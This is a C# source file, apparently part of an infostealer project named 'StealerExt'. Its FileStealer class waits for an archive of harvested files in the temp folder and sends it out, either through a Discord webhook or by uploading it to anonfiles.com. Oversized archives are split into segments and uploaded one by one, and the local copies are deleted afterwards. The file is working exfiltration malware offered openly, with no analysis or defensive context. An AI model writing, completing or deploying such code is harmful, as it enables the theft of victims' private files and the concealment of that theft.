using Ionic.Zip;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace StealerExt
{
    internal class FileStealer
    {   
        public static void GetFiles()
        {
            new API(API.wHook).idk("Waiting for file to be found and archived so it can be sent. If file is large then it can take a while!", null);
            string upload = API.Temp + "files.zip";
            string _FilesErr;
            while (!File.Exists(upload)) {}
            long size = new FileInfo(upload).Length;
            // Upload to cdn.discord.com via webhook.
            if (size < 7900000) 
            {
                new API(API.wHook).idk("File found! Sending...", upload);
            } 
            // Upload to AnonFiles.com
            else if (size < 19500000000)
            {
                try
                {
                    using (var Client = new ExtendedWebClient())
                    {
                        Client.Timeout = Timeout.Infinite;
                        Client.AllowWriteStreamBuffering = false;
                        byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", upload);
                        Client.Dispose();
                        string ResponseBody = Encoding.ASCII.GetString(Response);
                        if (ResponseBody.Contains("\"error\": {"))
                        {
                            _FilesErr = "Error: " + ResponseBody.Split('"')[7] + "\r\n";
                        }
                        else
                        {
                            _FilesErr = "Files: " + ResponseBody.Split('"')[15] + "\r\n";
                        }
                    }
                }
                catch (Exception ex)
                {
                    _FilesErr = "Ex: " + ex.Message + "\r\n";
                }
                new API(API.wHook).idk(_FilesErr, null);
                File.Delete(upload);
            }
            // Split the zip file.
            else
            {
                ZipFile zip = ZipFile.Read(upload);
                zip.ExtractAll(API.Temp + "files", ExtractExistingFileAction.OverwriteSilently);
                using (ZipFile z = new ZipFile())
                {
                    z.AddDirectory(API.Temp + "files");
                    int s = 199000;
                    z.MaxOutputSegmentSize = s * 102400;
                    z.Save(API.Temp + "f.zip");
                }
                foreach (string file in Directory.GetFiles(API.Temp + "files", "f*.zip", SearchOption.TopDirectoryOnly))
                {
                    try
                    {
                        using (var Client = new ExtendedWebClient())
                        {
                            Client.Timeout = Timeout.Infinite;
                            Client.AllowWriteStreamBuffering = false;
                            byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", file);
                            Client.Dispose();
                            string ResponseBody = Encoding.ASCII.GetString(Response);
                            if (ResponseBody.Contains("\"error\": {"))
                            {
                                _FilesErr = "Error: " + ResponseBody.Split('"')[7];
                            }
                            else
                            {
                                _FilesErr = "Files: " + ResponseBody.Split('"')[15];
                            }
                        }
                    }
                    catch (WebException ex)
                    {
                        _FilesErr = "Ex: " + ex.Message;
                    }
                    new API(API.wHook).idk(_FilesErr, null);
                    File.Delete(file);
                }
            }
        }
    }
}
